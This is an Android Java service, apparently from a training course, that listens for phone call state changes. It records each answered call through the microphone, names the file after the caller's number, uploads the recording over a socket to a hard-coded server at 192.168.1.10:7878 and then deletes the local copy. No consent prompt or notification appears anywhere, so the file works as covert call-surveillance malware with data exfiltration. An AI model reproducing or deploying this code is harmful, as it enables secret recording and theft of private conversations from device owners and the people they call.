package cn.itcast.phonelistener;

import java.io.File;
import java.io.OutputStream;
import java.io.PushbackInputStream;
import java.io.RandomAccessFile;
import java.net.Socket;

import cn.itcast.utils.StreamTool;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class PhoneListenService extends Service {
	private static final String TAG = "PhoneListenService";

	@Override
	public void onCreate() {
		super.onCreate();
		TelephonyManager telManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		telManager.listen(new TelephonyListener(), PhoneStateListener.LISTEN_CALL_STATE);
	}
	
	private final class TelephonyListener extends PhoneStateListener{
		private String mobile;
		private MediaRecorder recorder;
		private File audioFile;
		private boolean record;
		
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			try {
				switch (state){
				case TelephonyManager.CALL_STATE_IDLE: /* 无任何状态时 */
					if(recorder!=null){
						recorder.stop();
						recorder.release();
						record = false;
						new Thread(new UploadTask()).start();//上传文件到服务器
					}
					break;
				case TelephonyManager.CALL_STATE_OFFHOOK: /* 接起电话时 */
					audioFile = new File(Environment.getExternalStorageDirectory(), mobile+"_"+ System.currentTimeMillis()+".3gp");
					recorder = new MediaRecorder();
					recorder.setAudioSource(MediaRecorder.AudioSource.MIC);//从麦克风采集声音
					recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);//内容输出格式
					recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);//音频编码方式
					recorder.setOutputFile(audioFile.getAbsolutePath());
					recorder.prepare();//预期准备
					recorder.start(); //开始刻录
					record = true;
					break;	
					
				case TelephonyManager.CALL_STATE_RINGING: /* 电话进来时 */
					mobile = incomingNumber;
					break;
				default:
					break;
				}
			} catch (Exception e) {
				Log.e(TAG, e.toString());
			}
			
			super.onCallStateChanged(state, incomingNumber);
		}	
		
		private final class UploadTask implements Runnable{
			@Override
			public void run() {
				try {
					Socket socket = new Socket("192.168.1.10", 7878);
		            OutputStream outStream = socket.getOutputStream();
		            String head = "Content-Length="+ audioFile.length() + ";filename="+ audioFile.getName() + ";sourceid=\r\n";
		            outStream.write(head.getBytes());
		            
		            PushbackInputStream inStream = new PushbackInputStream(socket.getInputStream());	
					String response = StreamTool.readLine(inStream);
		            String[] items = response.split(";");
					String position = items[1].substring(items[1].indexOf("=")+1);
					
					RandomAccessFile fileOutStream = new RandomAccessFile(audioFile, "r");
					fileOutStream.seek(Integer.valueOf(position));
					byte[] buffer = new byte[1024];
					int len = -1;
					while( (len = fileOutStream.read(buffer)) != -1){
						outStream.write(buffer, 0, len);
					}
					fileOutStream.close();
					outStream.close();
		            inStream.close();
		            socket.close();
		            audioFile.delete();
		        } catch (Exception e) {                    
		            e.printStackTrace();
		        }
			}
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

}
